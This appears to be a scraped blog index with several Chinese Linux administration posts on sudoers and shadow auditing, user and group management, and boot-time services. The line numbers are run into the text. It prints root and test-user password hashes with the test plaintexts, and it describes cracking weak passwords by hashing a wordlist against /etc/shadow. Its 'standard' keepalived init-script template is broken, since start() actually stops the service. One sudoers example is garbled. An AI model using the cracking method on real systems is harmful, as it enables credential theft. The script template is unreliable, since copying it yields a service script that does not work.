12345678910111213141516cat /etc/sudoers## Next comes the main part: which users can run what software on ## which machines (the sudoers file can be shared between multiple## systems).## Syntax:#### user MACHINE=COMMANDS#### The COMMANDS section may have other options added to it.#### Allow root to run any commands anywhere root ALL=(ALL) ALL通过读取/etc/sudoers配置文件，查看是否存在其他用户。jay ALL=(ALL) NOPASSWD:ALL分析是否存在 NOPASSWD字段 弱口令账号、已禁用账号 1234cat /etc/shadow首先查看密码的加密方式$6$是用SHA-512加密,$1$ 表明是用MD5加密,$5$ 是用SHA-256加密,$2$ 是用Blowfish加密的；加密方式后是Sault。然后通过本地弱口令密码表以相同的盐和加密方式，加密生成密文，与shadow文件的密文进行比对。 12345678在这里可以把已锁定的账号也归为禁用账号：usermod -L xxx 锁定usermod -U xxx 解除锁定检查/etc/passwd文件，第二个字段中默认的“x”是否变成其他字符，若变成其他字符，该账号就不能登录；检查/etc/passwd文件，最后的shell是否为/sbin/nologin，若为/sbin/nologin也不能登录；检查/etc/shadow文件，第二个密码字段前面是否存在一个“!”，若存在“!”，则该账号不能登录（usermod -L xxx）;检查/etc/shadow文件，判断最后两个冒号之间的数字（表示账号取消日期，从1970开始算起的第N天开始失效）。 密钥认证登录 12345基于密钥认证的配置 # vi /etc/ssh/sshd_config PasswordAuthentication no //禁止使用基于口令认证的方式登陆 PubkeyAuthentication yes //允许使用基于密钥认证的方式登陆 # /etc/init.d/sshd reload 二、Linux系统下的用户审计方法 待总结~","tags":[{"name":"Linux","slug":"Linux","permalink":"http://pirogue.org/tags/Linux/"},{"name":"系统","slug":"系统","permalink":"http://pirogue.org/tags/系统/"},{"name":"运维","slug":"运维","permalink":"http://pirogue.org/tags/运维/"},{"name":"审计策略","slug":"审计策略","permalink":"http://pirogue.org/tags/审计策略/"}]},{"title":"Linux账户管理","date":"2017-02-08T07:05:29.000Z","path":"2017/02/08/Linux账户管理/","text":"1. 用户信息与密码的配置文件1) 用户信息文件： /etc/passwd 1234567891011121314151617181920[root@localhost ~]# cat /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinsaslauth:x:499:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin 每一行内容存放一个用户的信息，每个用户信息有7部分组成。 1234567891011root:x:0:0:root:/root:/bin/bash通过“冒号”分割，解释说明：root 用户名 用户登录系统时使用的用户名x 密码 密码位0 UID 用户标示号0 GID 缺省组标示root 注释性描述 例如存放用户全名等信息/root 宿主目录 用户登录系统后的缺省目录/bin/bash 命令解释器 用户使用的Shell，默认为bash/sbin/nologin 表示该账号不能用来登录Linux系统 sh(BourneShell),csh(CShell),ksh(KornShell),tcsh(TENEX/TOPS-20typeCShell),bash(BourneAgainShell)等。 密码位 1最早的Linux这个位置真的是放密码的，但因为不安全，所以就将密码单独存放在了/etc/shadow中。 UID 决定了用户权限而不是用户名。 1Linux用户分为三种：超级用户（root UID=0）,普通用户（CentOS6 UID 500~60000|CentOS7 UID 1000-60000），伪用户或叫系统用户、虚拟用户、假用户（Centos6 UID 1~499|Centos7 UID 1~999） 伪用户 1234567A.bin、daemon、shutdown、halt等，任何Linux系统默认都有这些伪用户。mail、news、games、apache、ftp、mysql及sshd等，与Linux的进程相关。B.伪用户通常不需要或无法登陆系统C.可以没有宿主目录 2）密码文件： /etc/shadow12[root@localhost ~]# ls -al /etc/shadow----------. 1 root root 592 Feb 6 18:03 /etc/shadow 密码文件内容 1234567891011121314151617181920[root@localhost ~]# cat /etc/shadowroot:$6$IglT.f7rqrwKA7tJ$1YXkCR3shYkNopl03UaIrBf7e1PUW9JXkxlpHg4sb8MPKy4xYqFVelynW7Ww6F.x1nfqKknJZzE6n7vKENAZP0:17203:0:99999:7:::bin:*:15628:0:99999:7:::daemon:*:15628:0:99999:7:::adm:*:15628:0:99999:7:::lp:*:15628:0:99999:7:::sync:*:15628:0:99999:7:::shutdown:*:15628:0:99999:7:::halt:*:15628:0:99999:7:::mail:*:15628:0:99999:7:::uucp:*:15628:0:99999:7:::operator:*:15628:0:99999:7:::games:*:15628:0:99999:7:::gopher:*:15628:0:99999:7:::ftp:*:15628:0:99999:7:::nobody:*:15628:0:99999:7:::vcsa:!!:17203::::::saslauth:!!:17203::::::postfix:!!:17203::::::sshd:!!:17203:::::: 密码文件说明 1234567891011root:$6$IglT.f7rqrwKA7tJ$1YXkCR3shYkNopl03UaIrBf7e1PUW9JXkxlpHg4sb8MPKy4xYqFVelynW7Ww6F.x1nfqKknJZzE6n7vKENAZP0:17203:0:99999:7:::root 用户名 用户登录系统时使用的用户名$6$IglT.f7rqrwKA7tJ$1YXkCR3shYkNopl03UaIrBf7e1PUW9JXkxlpHg4sb8MPKy4xYqFVelynW7Ww6F.x1nfqKknJZzE6n7vKENAZP0 密码17203 最后一次修改时间 Linux这里以1970年1月1日作为1,1971年1月1日就是366，依次类推到我修改密码的日期表示为17203。0 最小时间间隔 这个字段代表要经过多久才可以更改密码。0表示密码可以随时更改。99999 最大时间间隔 由于害怕密码被人盗取而危害到整个系统的安全，所以安排了这个字段，你必须在这个时间内重新修改密码，否则这个账号将暂时失效。99999表示密码不需要重新输入，最好设定一段时间修改密码，确保系统安全。7 密码变更期期限快到前的警告期：当账号的密码失效期限快到时，系统依据这个字段的设定发出警告，提醒用户“再过n天您的密码将过期，请尽快重新设定密码。”默认是7天。账号失效期： 如果用户过了警告期没有重新输入密码，使得密码失效，而该用户在这个字段限定的时间内又没有向管理员反映，让账号重新启用，那么这个账号将暂时失效。账号取消日期：这个日期跟第三个字段一样，都是使用1970年以来的日期设定方法。这个字段表示，这个账号在此字段规定的日期之后将无法再使用。这个字段常用于收费服务系统中，可以规定一个日期让该账号不能再使用。保留： 最后一个字段是保留的，看以后有没有新功能加入。 加密方式说明$id$salt$encrypted 1234$6$ 开头的，表明是用SHA-512加密。$1$ 表明是用MD5加密。$2$ 是用Blowfish加密的。$5$ 是用SHA-256加密。 shadow文件保存了密码，而passwd文件中没有保存密码，为什么不把passwd文件中的密码位取消掉？ 12345678910111213141516171819202122232425262728[root@localhost ~]# grep root /etc/passwd /etc/shadow/etc/passwd:root:x:0:0:root:/root:/bin/bash/etc/passwd:operator:x:11:0:operator:/root:/sbin/nologin/etc/shadow:root:$6$IglT.f7rqrwKA7tJ$1YXkCR3shYkNopl03UaIrBf7e1PUW9JXkxlpHg4sb8MPKy4xYqFVelynW7Ww6F.x1nfqKknJZzE6n7vKENAZP0:17203:0:99999:7:::[root@localhost ~]# pwunconv 将密码回写[root@localhost ~]# grep root /etc/passwd /etc/shadow/etc/passwd:root:$6$IglT.f7rqrwKA7tJ$1YXkCR3shYkNopl03UaIrBf7e1PUW9JXkxlpHg4sb8MPKy4xYqFVelynW7Ww6F.x1nfqKknJZzE6n7vKENAZP0:0:0:root:/root:/bin/bash/etc/passwd:operator:*:11:0:operator:/root:/sbin/nologingrep: /etc/shadow: No such file or directory[root@localhost ~]# ls /etc/shadowls: cannot access /etc/shadow: No such file or directory但此时依然可通过用户名、密码登录：[c:\\~]$ ssh 192.168.0.128Connecting to 192.168.0.128:22...Connection established.To escape to local shell, press &apos;Ctrl+Alt+]&apos;.Last login: Tue Feb 7 09:55:23 2017 from 192.168.0.1[root@localhost ~]# pwconv 转换到shadow文件中，只不过这个动作平时由Linux自动完成。[root@localhost ~]# grep root /etc/passwd /etc/shadow/etc/passwd:root:x:0:0:root:/root:/bin/bash/etc/passwd:operator:x:11:0:operator:/root:/sbin/nologin/etc/shadow:root:$6$IglT.f7rqrwKA7tJ$1YXkCR3shYkNopl03UaIrBf7e1PUW9JXkxlpHg4sb8MPKy4xYqFVelynW7Ww6F.x1nfqKknJZzE6n7vKENAZP0:17204:0:99999:7::: 3）用户组文件： /etc/group1234567891011121314151617181920212223242526272829303132333435[root@localhost ~]# cat /etc/grouproot:x:0:bin:x:1:bin,daemondaemon:x:2:bin,daemonsys:x:3:bin,admadm:x:4:adm,daemontty:x:5:disk:x:6:lp:x:7:daemonmem:x:8:kmem:x:9:wheel:x:10:mail:x:12:mail,postfixuucp:x:14:man:x:15:games:x:20:gopher:x:30:video:x:39:dip:x:40:ftp:x:50:lock:x:54:audio:x:63:nobody:x:99:users:x:100:utmp:x:22:utempter:x:35:floppy:x:19:vcsa:x:69:cdrom:x:11:tape:x:33:dialout:x:18:saslauth:x:76:postdrop:x:90:postfix:x:89:sshd:x:74: group配置文件说明12345root:x:0:第一字段：是用户组的名称，有字幕或数字构成。与/etc/passwd中的登录名一样，组名不应重复。第二字段：字段存放的是用户组加密后的密码。一般为是x，因为密码存在/etc/gshadow。第三字段：与用户标识号类似，也是一个整数，被系统内部用来表示组。第四字段：是属于这个组的所有用户的列表，不同用户之间用逗号分隔。这个用户组可能是用户的主组，也可能是附加组。 4）用户组密码文件： /etc/gshadow1234567891011121314151617181920212223242526272829303132333435[root@localhost ~]# cat /etc/gshadowroot:::bin:::bin,daemondaemon:::bin,daemonsys:::bin,admadm:::adm,daemontty:::disk:::lp:::daemonmem:::kmem:::wheel:::mail:::mail,postfixuucp:::man:::games:::gopher:::video:::dip:::ftp:::lock:::audio:::nobody:::users:::utmp:!::utempter:!::floppy:!::vcsa:!::cdrom:!::tape:!::dialout:!::saslauth:!::postdrop:!::postfix:!::sshd:!:: 在gshadow配置文件说明 123456root:*::第一字段：是用户组的名称，由字母或数字构成。与/etc/group中的登录名一样。第二字段：字段存放的是用户组加密后的密码。如果开头为！表示无合法密码。第三字段：用户组管理员的所属帐号。第四字段：该用户组所属帐号。与/etc/group中的一样一个账户可以有多个用户组，当前时刻所属的用户组成为有效用户组。 查询当前有效用户组 123[root@localhost ~]# groupsroot此时创建的文件的用户组就所属有效用户组root。 更改有效用户组： 1234newgrp xxxgroupsxxx root第一列出的就是当前有效用户组 5）用户配置文件：/etc/login.defs、/etc/default/useradd 当我们新建用户时，通过/etc/login.defs和/etc/default/useradd 两文件实现新用户的基本设置。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[root@localhost ~]# cat /etc/login.defs ## Please note that the parameters in this configuration file control the# behavior of the tools from the shadow-utils component. None of these# tools uses the PAM mechanism, and the utilities that use PAM (such as the# passwd command) should therefore be configured elsewhere. Refer to# /etc/pam.d/system-auth for more information.## *REQUIRED*# Directory where mailboxes reside, _or_ name of file, relative to the# home directory. If you _do_ define both, MAIL_DIR takes precedence.# QMAIL_DIR is for Qmail##QMAIL_DIR MaildirMAIL_DIR /var/spool/mail#MAIL_FILE .mail# Password aging controls:## PASS_MAX_DAYS Maximum number of days a password may be used.# PASS_MIN_DAYS Minimum number of days allowed between password changes.# PASS_MIN_LEN Minimum acceptable password length.# PASS_WARN_AGE Number of days warning given before a password expires.#PASS_MAX_DAYS 99999PASS_MIN_DAYS 0PASS_MIN_LEN 5PASS_WARN_AGE 7## Min/max values for automatic uid selection in useradd#UID_MIN 500UID_MAX 60000## Min/max values for automatic gid selection in groupadd#GID_MIN 500GID_MAX 60000## If defined, this command is run when removing a user.# It should remove any at/cron/print jobs etc. owned by# the user to be removed (passed as the first argument).##USERDEL_CMD /usr/sbin/userdel_local## If useradd should create home directories for users by default# On RH systems, we do. This option is overridden with the -m flag on# useradd command line.#CREATE_HOME yes# The permission mask is initialized to this value. If not specified, # the permission mask will be initialized to 022.UMASK 077# This enables userdel to remove user groups if no members exist.#USERGROUPS_ENAB yes# Use SHA512 to encrypt password.ENCRYPT_METHOD SHA512 /etc/login.defs配置文件说明 12345678910111213141516MAIL_DIR /var/spool/mail 邮件默认目录存放处PASS_MAX_DAYS 99999 密码需要变更时间PASS_MIN_DAYS 0 密码多久需要变更PASS_MIN_LEN 5 密码最小长度PASS_WARN_AGE 7 密码失效之前几天发送警告信息UID_MIN 500 默认账号起始的最小UID数UID_MAX 60000 最大的UID限制GID_MIN 500 默认账号起始的最小GID数GID_MAX 60000 最大的GID限制CREATE_HOME yes 是否建立用户根目录，默认是“yes”，如果选择“no”，就是不建立ENCRYPT_METHOD SHA512 采用SHA512加密 /etc/default/useradd配置文件说明 123456789[root@localhost ~]# cat /etc/default/useradd # useradd defaults fileGROUP=100 默认用户群组为100HOME=/home 默认用户的根目录INACTIVE=-1 是否启用账号过期停权，-1表示不启用，正数代表天数EXPIRE= 是否设定到期时间，如果需要，可以设定一个数值，那么用户到期后就不能登录系统SHELL=/bin/bash 默认的shellSKEL=/etc/skel 默认配置文件路径，创建账号时此路径下的文件会拷贝到用户的家目录CREATE_MAIL_SPOOL=yes 是否创建邮件池 5）新用户信息文件： /etc/skelskel 是skeleton的缩写，每当你新建一个用户的时候（用过useradd命令），/etc/skel目录下的文件，都会原封不动的负值到新建用户的家目录下。 1234567[root@localhost ~]# ls -al /etc/skel/total 20drwxr-xr-x. 2 root root 4096 Feb 6 18:00 .drwxr-xr-x. 58 root root 4096 Feb 7 09:56 ..-rw-r--r--. 1 root root 18 Feb 22 2013 .bash_logout-rw-r--r--. 1 root root 176 Feb 22 2013 .bash_profile-rw-r--r--. 1 root root 124 Feb 22 2013 .bashrc 6）布告栏信息：/etc/motd/etc/motd即messageoftoday（布告栏信息），每次用户登录时，/etc/motd文件的内容会显示在用户的终端。系统管理员可以在文件中编辑系统活动消息，例如：管理员通知用户系统何时进行软件或硬件的升级、何时进行系统维护等。如果shell支持中文，还可以使用中文，这样看起来更易于了解。/etc/motd缺点是，现在许多用户登录系统时选择自动进入图形界面，所以这些信息往往看不到。 1/etc/issue文件的使用方法与/etc/motd文件相差不大，它们的主要区别在于：当一个网络用户或通过串口登录系统上时，/etc/issue的文件内容显示在login提示符之前，而/etc/motd内容显示在用户成功登录系统之后。 2. 创建用户1）命令12345678useradd //添加用户passwd //为用户设置密码 userdel //删除用户usermod //修改用户信息groupadd //添加用户组groupdel //删除用户组groupmod //修改用户组信息groups //显示当前进程用户所属的用户组 最简单的创建用户 1234567[root@localhost ~]# useradd test[root@localhost ~]# passwd testChanging password for user test.New password: BAD PASSWORD: it is based on a dictionary wordRetype new password: passwd: all authentication tokens updated successfully. 用户名为test，密码为test123。 查看用户信息 12[root@localhost ~]# id testuid=500(test) gid=500(test) groups=500(test) 创建第二个用户test1 1234567891011121314[root@localhost ~]# useradd test1[root@localhost ~]# passwd test1Changing password for user test1.New password: BAD PASSWORD: it is too simplistic/systematicRetype new password: passwd: all authentication tokens updated successfully.用户名为test1,密码为abc123,。[root@localhost ~]# id test1uid=501(test1) gid=501(test1) groups=501(test1)发现uid和gid递增了1。新建第一个用户时，uid和gid为配置文件中定义的默认最小值。 带参数的创建用户 useradd 参数1234567891011121314151617181920212223 -b, --base-dir BASE_DIR 新账户的主目录的基目录-c, --comment COMMENT 新账户的 GECOS 字段-d, --home-dir HOME_DIR 新账户的主目录-D, --defaults 显示或更改默认的 useradd 配置-e, --expiredate EXPIRE_DATE 新账户的过期日期-f, --inactive INACTIVE 新账户的密码不活动期-g, --gid GROUP 新账户主组的名称或 ID-G, --groups GROUPS 新账户的附加组列表-h, --help 显示此帮助信息并推出-k, --skel SKEL_DIR 使用此目录作为骨架目录-K, --key KEY=VALUE 不使用 /etc/login.defs 中的默认值-l, --no-log-init 不要将此用户添加到最近登录和登录失败数据库-m, --create-home 创建用户的主目录-M, --no-create-home 不创建用户的主目录-N, --no-user-group 不创建同名的组-o, --non-unique 允许使用重复的 UID 创建用户-p, --password PASSWORD 加密后的新账户密码-r, --system 创建一个系统账户-R, --root CHROOT_DIR chroot 到的目录-s, --shell SHELL 新账户的登录 shell-u, --uid UID 新账户的用户 ID-U, --user-group 创建与用户同名的组-Z, --selinux-user SEUSER 为 SELinux 用户映射使用指定 SEUSER 新建一个UID为502，GID位600,30天有效期，用户组为test3，家目录为/home/thirty的用户test2。 123456789[root@localhost ~]# groupadd -g 600 test3[root@localhost ~]# useradd -u 501 -g 600 -f 30 -m -d /home/thirty test2useradd: UID 501 is not unique[root@localhost ~]# useradd -u 502 -g 600 -f 30 -m -d /home/thirty test2[root@localhost ~]# id test2uid=502(test2) gid=600(test3) groups=600(test3)[root@localhost ~]# ls /home/test test1 thirty 3. 更改用户设置不同的用户需要不同的权限，拥有不同的SHELL，是否允许登录。这个部分，就需要用到usermod命令修改用户配置。 禁止test1用户登录 123456789101112131415161718192021222324[root@localhost test1]# usermod -s /sbin/nologin test1[root@localhost test1]# su test1This account is currently not available.[c:\\~]$ ssh 192.168.0.128Connecting to 192.168.0.128:22...Connection established.To escape to local shell, press &apos;Ctrl+Alt+]&apos;.Last login: Tue Feb 7 12:31:35 2017 from 192.168.0.1This account is currently not available.Connection closed by foreign host.Disconnected from remote host(192.168.0.128:22) at 20:04:08.Type `help&apos; to learn how to use Xshell prompt.[root@localhost test1]# cat /etc/passwd|grep test1test1:x:501:501::/home/test1:/sbin/nologin[root@localhost test1]# cat /etc/shadow |grep test1test1:$6$PtGopWUu$IEvEngLz3S1Nx6MP0EF60EKzagdbRZhGqSn0vE4JTrra221.G7.8RLBUytHkyNXNPs8SSqm/IfdKolS4SS0Vv/:17204:0:99999:7::: 修改用户名 12345[root@localhost ~]# usermod -l test-1 test1[root@localhost ~]# cat /etc/passwd|grep test-1test-1:x:501:501::/home/test1:/sbin/nologin[root@localhost ~]# cat /etc/shadow |grep test-1test-1:$6$PtGopWUu$IEvEngLz3S1Nx6MP0EF60EKzagdbRZhGqSn0vE4JTrra221.G7.8RLBUytHkyNXNPs8SSqm/IfdKolS4SS0Vv/:17204:0:99999:7::: 12345678910111213141516171819202122232425[root@localhost ~]# usermod Usage: usermod [options] LOGINOptions: -c, --comment COMMENT new value of the GECOS field -d, --home HOME_DIR new home directory for the user account -e, --expiredate EXPIRE_DATE set account expiration date to EXPIRE_DATE -f, --inactive INACTIVE set password inactive after expiration to INACTIVE -g, --gid GROUP force use GROUP as new primary group -G, --groups GROUPS new list of supplementary GROUPS -a, --append append the user to the supplemental GROUPS mentioned by the -G option without removing him/her from other groups -h, --help display this help message and exit -l, --login NEW_LOGIN new value of the login name -L, --lock lock the user account -m, --move-home move contents of the home directory to the new location (use only with -d) -o, --non-unique allow using duplicate (non-unique) UID -p, --password PASSWORD use encrypted password for the new password -s, --shell SHELL new login shell for the user account -u, --uid UID new UID for the user account -U, --unlock unlock the user account -Z, --selinux-user new SELinux user mapping for the user account 4. 删除用户/组当我们创建用户/组有错误时，可能会删除用户/组，然后再重新创建。我们使用userdel命令来删除用户。 执行命令：12345[root@localhost ~]# userdel test执行完成后，/etc/passwd和/etc/shadow下的test用户信息已经被删除[root@localhost ~]# ls /home/test test1 thirty但home目录下的用户目录是存在的。 5. sudo执行命令将当前用户切换到超级用户下，或切换到指定的用户下，然后以超级用户或其指定切换到的用户身份执行命令，执行完成后，直接退回到当前用户。 具体工作过程如下： 当用户执行sudo时，系统会主动寻找/etc/sudoers文件，判断该用户是否有执行sudo的权限 –&gt;确认用户具有可执行sudo的权限后，让用户输入用户自己的密码确认 –&gt;若密码输入成功，则开始执行sudo后续的命令 基本配置格式 /etc/sudoer的通用格式：user host run_as commanduser：一位或几位用户，在/etc/group中可以用一个%代替它，组对象的名称一定要用百分号%开头。host：一个或几个主机名；run_as：作为哪个用户运行，常见的选项是root和ALLcmmand：想让用户或组运行的一个或几个根级别命令 admin ALL=(ALL) ALL第一个ALL表示所有计算机；第二个ALL表示所有用户；第三个ALL表示所有命令。授权admin用户在所有计算机上以所有用户的身份运行所有命令。 %admin ALL=(ALL) NOPASSWD:NOPASSWD ALL admin组的用户都sudo不用密码 %admin ALL=(ALL) NOPASSWD:useradd,userdel 授权admin组全部成员在所有计算机上以所有用户的身份运行useradd，userdel命令；且运行时不必输入密码。 1234需要注意的是，当我们为用用户定义可以运行的命令时，必须使用完整的命令路径。这样做是完全出于安全的考虑，如果我们给出的命令只是简单的useradd而非/usr/sbin/useradd，那么用户有可能创建一个他自己的脚本，也就做useradd，然后放在它的本地路径中，如此一来他就能够通过这个名为useradd的本地脚本，作为root来执行任何他想要的命令了。这是相当危险的！ %account ALL=(root) /usr/sbin/useradd,/usr/sbin/userdel,/usr/sbin/usermodaccounts组中的任何成员都能运行useradd、userdel和usermod命令。 jay ALL=NOPASSWD:/usr/bin/abc.sh,/usr/sbin/adduser jay用户sudo不用密码即可执行某几个命令 jay ALL=(ALL) NOPASSWD:ALL 让普通用户jay 具有所有超级用户的权限而又不用输入密码","tags":[{"name":"Linux","slug":"Linux","permalink":"http://pirogue.org/tags/Linux/"},{"name":"系统","slug":"系统","permalink":"http://pirogue.org/tags/系统/"},{"name":"运维","slug":"运维","permalink":"http://pirogue.org/tags/运维/"},{"name":"账户管理","slug":"账户管理","permalink":"http://pirogue.org/tags/账户管理/"}]},{"title":"Linux启动服务配置文件的作用和流程","date":"2017-02-07T16:48:56.000Z","path":"2017/02/08/Linux启动服务配置文件的作用和流程/","text":"一、Linux最小化安装后默认开机启动服务 二、每个进程服务的用途 三、注册服务脚本四、chkconfig命令 五、服务脚本重要行 1. Linux最小化安装后默认开机启动服务1234567891011121314151617181920212223242526[root@localhost ~]# ls -al /etc/init.d/total 144drwxr-xr-x. 2 root root 4096 Feb 6 18:02 .drwxr-xr-x. 10 root root 4096 Feb 6 18:01 ..-rwxr-xr-x. 1 root root 3378 Jun 22 2012 auditd-r-xr-xr-x. 1 root root 1340 Feb 22 2013 blk-availability-rwxr-xr-x. 1 root root 2793 Jul 19 2011 crond-rw-r--r--. 1 root root 18216 Jan 9 2013 functions-rwxr-xr-x. 1 root root 5829 Jan 9 2013 halt-rwxr-xr-x. 1 root root 9515 Feb 22 2013 ip6tables-rwxr-xr-x. 1 root root 9409 Feb 22 2013 iptables-rwxr-xr-x. 1 root root 652 Jan 9 2013 killall-r-xr-xr-x. 1 root root 2134 Feb 22 2013 lvm2-lvmetad-r-xr-xr-x. 1 root root 2665 Feb 22 2013 lvm2-monitor-rwxr-xr-x. 1 root root 2989 Jan 9 2013 netconsole-rwxr-xr-x. 1 root root 5486 Jan 9 2013 netfs-rwxr-xr-x. 1 root root 6334 Jan 9 2013 network-rwxr-xr-x. 1 root root 3852 Dec 3 2011 postfix-rwxr-xr-x. 1 root root 1559 May 20 2009 rdisc-rwxr-xr-x. 1 root root 1822 Feb 22 2013 restorecond-rwxr-xr-x. 1 root root 2011 Jan 10 2013 rsyslog-rwxr-xr-x. 1 root root 1698 Feb 22 2013 sandbox-rwxr-xr-x. 1 root root 2056 Nov 20 2012 saslauthd-rwxr-xr-x. 1 root root 647 Jan 9 2013 single-rwxr-xr-x. 1 root root 4534 Feb 22 2013 sshd-rwxr-xr-x. 1 root root 2294 Feb 22 2013 udev-post 1234567891011121314151617[root@localhost init.d]# chkconfig \\--listauditd 0:off 1:off 2:on 3:on 4:on 5:on 6:offblk-availability 0:off 1:on 2:on 3:on 4:on 5:on 6:offcrond 0:off 1:off 2:on 3:on 4:on 5:on 6:offip6tables 0:off 1:off 2:on 3:on 4:on 5:on 6:offiptables 0:off 1:off 2:on 3:on 4:on 5:on 6:offlvm2-monitor 0:off 1:on 2:on 3:on 4:on 5:on 6:offnetconsole 0:off 1:off 2:off 3:off 4:off 5:off 6:offnetfs 0:off 1:off 2:off 3:on 4:on 5:on 6:offnetwork 0:off 1:off 2:on 3:on 4:on 5:on 6:offpostfix 0:off 1:off 2:on 3:on 4:on 5:on 6:offrdisc 0:off 1:off 2:off 3:off 4:off 5:off 6:offrestorecond 0:off 1:off 2:off 3:off 4:off 5:off 6:offrsyslog 0:off 1:off 2:on 3:on 4:on 5:on 6:offsaslauthd 0:off 1:off 2:off 3:off 4:off 5:off 6:offsshd 0:off 1:off 2:on 3:on 4:on 5:on 6:offudev-post 0:off 1:on 2:on 3:on 4:on 5:on 6:off 2. 每个进程服务的用途auditdauditd（或auditd守护进程）是Linux审计系统中用户空间的一个组件，其负责将审计记录写入磁盘。默认开启。 blk-availabilitylvm2相关，如果用lvm，建议开启。 LVM是Logical Volume Manager（逻辑卷管理器）的简写，又译为逻辑卷宗管理器、逻辑扇区管理器、逻辑磁盘管理器。是Linux核心所提供的逻辑卷管理（Logical Volume Management）功能。它在硬盘的硬盘分区之上，又创建了一个逻辑层以方便系统管理硬盘分区系统。逻辑卷的创建，就是将多块硬盘创建物理卷，而将这些物理卷以逻辑的形式总成一个容器，然后从这个容器里面创建大小不同的分区文件，而这个容器就是所谓的卷组（VG），而从这个容器里创建大小不同的分区文件，这个分区文件就叫做逻辑卷。 crond计划任务管理，默认开启。 functionsfunctions这个脚本是给/etc/init.d里边的文件使用的，提供了一些基础的功能。首先会设置umask，path，还有语言环境，然后会设置success，failure，warning，normal集中情况下的字体颜色。 还有其他一些重要方法： checkpid:检查是否已存在pid，如果有一个存在，返回0（通过查看/proc目录） daemon:启动某个服务。/etc/init.d目录部分脚本的start使用到这个 killproc:杀死某个进程。/etc/init.d目录部分脚本的stop使用到这个 pidfileofproc:寻找某个进程的pid pidofproc:类似上面的，只是还查找了pidof命令 status:返回一个服务的状态 echo_success,echo_failure,echo_passed,echo_warning分别输出各类信息 success,failure,passed,warning分别记录日志并调用相应的方法 action:打印某个信息并执行给定的命令，它会根据命令执行的结果来调用 success,failure方法 strstr:判断$1是否含有$2 confirm:显示 “Start service $1 (Y)es/(N)o/(C)ontinue? [Y]”的提示信息，并返回选择结果 halt当进入运行级别为0（halt）或者运行级别为6（reboot）时，这个文件被执行用来初始化。它将杀掉所有进程，卸载文件系统，然后停止或重启。 ip6tablesipv6防火墙，默认开启。用到ipv6网络的就用，一般关闭。 iptablesipv4防火墙，默认开启。 killall该脚本用于把所有正在运行的，且不需要的服务都停掉。 lvm2-lvmetad这个文件是LVM2的的一部分。它通常是用来处理使用lvcreate -m 参数创建导致的LVM2镜像设备的失败。 lvm2-monitorlvm监视，如果使用LVM逻辑卷管理就开启。默认开启。 netconsoleNetconsole用于将本地主机的日志信息打印到远程主机上，便于远程用户查看日志信息。默认开启。 netfsnetfs该服务用于在系统启动时自动挂载网络中的共享文件空间，比如NFS，Samba等等。如果你连接到局域网中的其它服务器并进行文件共享，就开启它。大多数台式机和笔记本用户应该关闭它。 默认开启。 network系统启动时激活所有网络接口。网络基础服务，是必需的。默认开启。 postfix替代sendmail的邮件服务，默认开启。如果无邮件服务，可关闭。 rdisc自动检测路由器，默认关闭。 12[root@localhost init.d]# service rdisc statusrdisc is stopped restorecondselinux相关，如果开启了selinux，就需开启。默认关闭。 12[root@localhost init.d]# service restorecond statusrestorecond is stopped rsyslog提供系统的登录档案记录。默认开启，系统日志关键服务，必需。 sandbox建立/挂载点共享，/var/tmp，/tmp，/home/sandbox 不共享。默认关闭。 saslauthdsasl认证守护进程。默认关闭。 single当进入runlevel 1时，这个文件被初始化执行，进入超级管理状态。它会杀死所有守护进程，系统进入单用户模式。注意这时文件系统保持挂载。 sshdssh服务端，可提供安全的shell登录。默认开启，ssh远程登录服务，必需。 udev-post设备管理系统。默认开启。 3. 注册服务脚本1） /etc/init.d/目录下的脚本名称就是服务注册时使用的服务。2） 服务脚本操作命令start ：启动服务 stop ：停止服务 status ：查看服务状态 condrestart ：类似restart，但是只有在服务存在时才会执行重启 restart ：重启服务，在服务进程不存在时直接启动服务 reload ：不进行重启，对服务的配置文件重新读取加载 3） 标准服务注册脚本模板1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!/bin/sh## Startup script for the Keepalived daemon## processname: keepalived# pidfile: /var/run/keepalived.pid# config: /etc/keepalived/keepalived.conf# chkconfig: - 21 79 #此处必须有，是chkconfig服务注册到linux启动级别的配置# description: Start and stop Keepalived# Source function library. /etc/rc.d/init.d/functions #加载脚本使用到的函数例如status、killproc# Source configuration file (we set KEEPALIVED_OPTIONS there). /etc/sysconfig/keepalived #服务的配置文件RETVAL=0 #状态码prog=&quot;keepalived&quot; #服务的进程文件名，进程号文件名keepalived.pidstart() &#123; echo -n $Stopping $prog: &quot; killproc keepalived #默认到/var/lock/subsys/、/var/run目录下查找对应的文件和pid 然后kill RETVAL=$? echo [ $RETVAL -eq 0 ] &amp;&amp; rm -f /var/lock/subsys/$prog #删除进程锁定文件&#125;stop() &#123; echo -n $&quot;Stopping $prog: &quot; killproc keepalived #默认到/var/lock/subsys/、/var/run目录下查找对应的文件和pid 然后kill RETVAL=$? echo [ $RETVAL -eq 0 ] &amp;&amp; rm -f /var/lock/subsys/$prog #删除进程锁定文件&#125;reload() &#123; echo -n $&quot;Reloading $prog: &quot; killproc keepalived -1 #查找配置文件并重新加载 RETVAL=$? echo&#125;# See how we were called.case &quot;$1&quot; in start) start ;; stop) stop ;; reload) reload ;; restart) stop start ;; condrestart) if [ -f /var/lock/subsys/$prog ]; then stop start fi ;; status) status keepalived ;; *) echo &quot;Usage: $0 &#123;start|stop|reload|restart|condrestart|status&#125;&quot; exit 1esacexit $RETVAL 